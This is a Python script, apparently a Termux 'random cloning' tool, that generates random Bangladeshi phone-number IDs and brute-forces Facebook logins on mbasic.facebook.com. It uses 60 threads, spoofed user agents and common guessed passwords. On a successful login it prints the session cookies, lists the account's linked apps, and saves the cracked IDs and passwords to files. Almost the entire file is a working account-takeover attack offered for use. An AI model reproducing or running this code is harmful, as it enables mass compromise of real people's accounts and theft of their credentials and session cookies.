#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('git pull')
    os.system('pkg install curl')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
R = '\033[31;1m'
RED = '\x1b[38;5;46m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
R = '{RED}' 
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
RED = '\x1b[38;5;208m'
WHITE = '\033[1;92m'
GREEN = '\033[\033[1;92m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
now = datetime.now()
dt_string = now.strftime("%H:%M")
currect = datetime.now()
yyyy = currect.year
mm = currect.month
dd = currect.day
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for sat in range(1000):
	a='NokiaX'
	b=random.randrange(1,9)
	c='-0'
	d=random.randrange(1,9)
	e='/'
	f=random.randrange(1,9)
	g='.0 ('
	h=random.randrange(1,12)
	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
	j='UNTRUSTED/'
	p=random.randrange(1,3)
	l='.0'
	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{p}{l}'
	ugen.append(uaku2)

nka = [
"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
]


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

  
logo=(f"""
{m}d8888b. db   d8b   db d88888b d8888b. {m}┏━┓
88  `8D 88   I8I   88 88'     88  `8D {m}┃{RED}𝙉{m}┃
88   88 88   I8I   88 88ooooo 88oooY' {m}┃{WHITE}𝙓{m}┃
88   88 Y8   I8I   88 88~~~~~ 88~~~b. {m}┃{GREEN}𝘾{m}┃
88  .8D `8b d8'8b d8' 88.     88   8D {m}┃{YELLOW}𝙔{m}┃
Y8888D'  `8b8' `8d8'  Y88888P Y8888P' {m}┃{BLUE}𝘽{m}┃
┏━━━━━━━━━━┓┏━━━━━━┓┏━━━┓┏━━━━━━━┓    {m}┃{k}𝙀{m}┃
┃𝙋𝙍𝙊𝙂𝙍𝘼𝙈𝙈𝙀𝙍┃┃𝙋𝙔𝙏𝙃𝙊𝙉┃┃𝘾++┃┃𝙃𝘼𝘾𝙆𝙄𝙉𝙂┃    {m}┃{u}𝙍{m}┃
┗━━━━━━━━━━┛┗━━━━━━┛┗━━━┛┗━━━━━━━┛    {m}┗━┛
{M}┏━━━━━━━━━━━━━{k}𝗡𝗼𝘄 𝗧𝗶𝗺𝗲 {H}• {N}[{O} {dt_string} {N}]{M}━━━━━━━━━━┓
{M}┃{k} 𝗖𝗥𝗘𝗔𝗧𝗢𝗥  {H}• {m}𝙉𝙓 𝘾𝙔𝘽𝙀𝙍{M}                       ┃
{M}┃{k} 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 {H}• {m}𝙈𝘿 𝙊𝙈𝘼𝙍 𝙁𝘼𝙍𝙐𝙆{M}                  ┃
{M}┃{k} 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 {H}• {m}𝙉𝙓 𝘾𝙔𝘽𝙀𝙍{M}                       ┃
{M}┃{k} 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 {H}• {m}𝟬𝟭𝟳𝟰𝟭𝟳𝟬𝟳𝟵𝟱𝟰{M}                    ┃
{M}┃{k} 𝗜𝗠𝗢      {H}• {m}𝟬𝟭𝟳𝟰𝟭𝟳𝟬𝟳𝟵𝟱𝟰{M}                    ┃
{M}┃{k} 𝗧𝗢𝗢𝗟𝗦    {H}• {m}𝙍𝘼𝙉𝘿𝙊𝙈 𝘾𝙇𝙊𝙉𝙄𝙉𝙂{M}                 ┃ 
{M}┃{k} 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  {H}• {m}𝙑 𝟭.𝟬{M}                          ┃
{M}┃{k} 𝗚𝗜𝗧𝗛𝗨𝗕   {H}• {m}𝙉𝙓-𝘾𝙔𝘽𝙀𝙍𝟰𝟬𝟰{M}                    ┃
{M}┃{k} 𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 {m}𝙉𝙓 𝘾𝙔𝘽𝙀𝙍 • 𝙊𝙈𝘼𝙍 𝙁𝘼𝙍𝙐𝙆{M}   ┃
{M}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
""")
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;37m01\33[1;92m][\033[1;93mA\33[1;92m] START RANDOM CLONING")
	print("[\033[1;37m02\33[1;92m][\033[1;93mB\33[1;92m] FOLLOW MY FB PAGE")
	print("[\033[1;37m03\33[1;92m][\033[1;93mC\33[1;92m] FOLLOW MY FB PROFILE")
	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] JOIN MESSENGER GROUP")
	print('[\033[1;37m00\33[1;92m][\033[1;93mE\33[1;92m] EXIT PROGRAMMING')
	print(54*'━')
	opt = input('Choose option >>> ')
	if opt in ["A","1"]:
		virusA()
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		#os.system('xdg-open t.me/mueorb');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		#os.system('xdg-open t.me/mueorb');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
		
	else:
		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
		Main()
def admin():
	os.system('clear')
	print(logo)
	print(50*'_')
	print(' [1] Contract WhatsApp ')
	print(' [2] FOLLOW MY FB PAGE ')
	print(' [3] Subscribe Youtube')
	print(' [0] Back to Main menu')
	bal = input('Choose option >>> ')
	if bal =='1':
		os.system('xdg-open t.me/mueorb');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open t.me/mueorb');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open t.me/mueorb');time.sleep(1)
		admin()
	if bal =='0':
		Main()
		
def virusA():
	user=[]
	os.system('clear')
	print(logo)
	print(" ┏━[•] BD SIM CODE 017 015 018 019 013 015 016]")
	kode = input(' ┗━[+] SELECT : ')
	doamin = ' BD Number id cloner [ONLY-OK] '
	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
	limit = int(input(' ┗━[+] LIMIT : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=60) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('┏━[•] COUNTRY    : Bangladesh')
		print('┣━[•] TOTAL ID   :  '+tl)
		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
		print('┗━[•] START BD UID MIXT CRACKING... ')
		print(50*'━')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you']
			yaari.submit(b,uid,pwx,tl)
	print(50*'_')
	print(' [💉] Crack process has been completed')
	print(' [💉] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()

def b(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝗡𝗫 𝗖𝗬𝗕𝗘𝗥\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https', 
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Opera";v="99"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5762.226", "Opera";v="99.0.2947.99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '"V2027"',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [𝗡𝗫 𝗖𝗬𝗕𝗘𝗥 𝗢𝗞] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[❤️‍🔥]=𝗖𝗢𝗢𝗞𝗜𝗘𝗦 : '+coki)
                cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/𝗡𝗫•𝗢𝗞.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [NX CYBER CP] '+uid+' | '+ps+'\33[0;92m')
                cps.appen(cid)
                open('/sdcard/NX-CP.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    except:

        pass
Main()
